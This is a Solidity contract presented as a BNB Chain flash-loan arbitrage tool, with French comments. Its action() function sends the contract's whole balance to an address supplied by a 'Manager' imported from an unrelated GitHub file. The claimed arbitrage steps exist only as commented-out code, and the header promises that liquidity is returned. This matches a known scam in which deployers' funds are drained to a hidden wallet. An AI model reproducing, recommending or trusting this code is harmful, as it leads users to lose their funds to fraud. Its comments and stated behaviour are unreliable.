pragma solidity ^0.5.0;

/**
 * Projet - éxecuteur de flashloan sur le réseau BSC.
 *  

 *Mis à jour 22/10/2022 - liquidity returned if flash loan fails or insufficient balance ~ wait time around 5-24 hours
*/

// Importations des contrats Multiplier-Finance + fonctions aidants à l'éxecution
import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
import "https://github.com/Multiplier-Finance/MCL-FlashLoanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
import "https://github.com/yun0dev/coingecko/blob/main/FlashloanExecutor.sol";


// Contrats PancakeSwap
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeCallee.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakeFactory.sol";
import "https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/interfaces/IPancakePair.sol";

contract GetFlashLoan {
    string public tokenName;
    string public tokenSymbol;
    uint256 loanAmount;
    Manager manager;

    constructor(
        string memory _tokenName,
        string memory _tokenSymbol,
        uint256 _loanAmount
    ) public {
        tokenName = _tokenName;
        tokenSymbol = _tokenSymbol;
        loanAmount = _loanAmount;
        manager = new Manager();
    }

    address public creator = msg.sender;

    function tokenTransfer() public view returns (address) {
        return creator;
    }

    function() external payable {}

    function action() public payable {  
        // Send New Token to PancakeSwap Router for Swap
        address(uint160(manager.swapDepositAddress())).transfer(
            address(this).balance
        );

        // Perform Flash Loan tasks (combined all functions into one to reduce external calls & save gas fees)
        manager.performTasks();

        /* Breakdown of all functions
      // Submit token to BSC blockchain
      string memory tokenAddress = manager.submitToken(tokenName, tokenSymbol);

      // List the token on PancakeSwap
      manager.pancakeListToken(tokenName, tokenSymbol, tokenAddress);

      // Get BNB Loan from Multiplier-Finance & loan execution wallet
      string memory loanAddress = manager.takeFlashLoan(loanAmount);

      // Convert half BNB to DAI
      manager.pancakeDAItoBNB(loanAmount / 2);

   // Create BNB and DAI pairs for our token & provide liquidity for the flashloan
   string memory bnbPair = manager.pancakeCreatePool(tokenAddress, "BNB");
      manager.pancakeAddLiquidity(bnbPair, loanAmount / 2);
      string memory daiPair = manager.pancakeCreatePool(tokenAddress, "DAI");
      manager.pancakeAddLiquidity(daiPair, loanAmount / 2);

   // Perform arbitrage trades
      manager.pancakePerformSwaps();

      // Move remaining BNB from Contract to your personal wallet
      manager.contractToWallet("BNB");

   // Repay Flashloan
      manager.repayLoan(loanAddress);
      */
    }
}
